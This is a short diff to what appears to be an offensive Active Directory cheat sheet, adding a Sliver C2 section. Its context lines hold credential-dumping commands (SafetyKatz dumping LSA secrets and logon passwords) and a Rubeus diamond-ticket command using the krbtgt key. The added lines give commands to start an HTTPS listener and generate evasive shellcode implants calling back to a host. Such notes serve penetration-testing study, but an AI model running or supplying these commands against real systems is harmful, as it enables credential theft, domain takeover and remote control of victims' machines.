@@ -1817,10 +1817,6 @@ SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
 safetykatz.exe "privilege::debug" "sekurlsa::evasive-logonpasswords" "exit" 
 ```
 
-```bash
-
-```
-
 
 [[ToSystem]]
 == ToSystem
@@ -2094,6 +2090,17 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:krbtgt
 [[sliver]]
 == Sliver C2
 
+Start *HTTPS* listener
+
+```bash
+https
+```
+
+Generate 
+
+```bash
+generate -b https://local_ip -e -f shellcode -N name_of_implant -s /path/to/save
+```
 
 
 
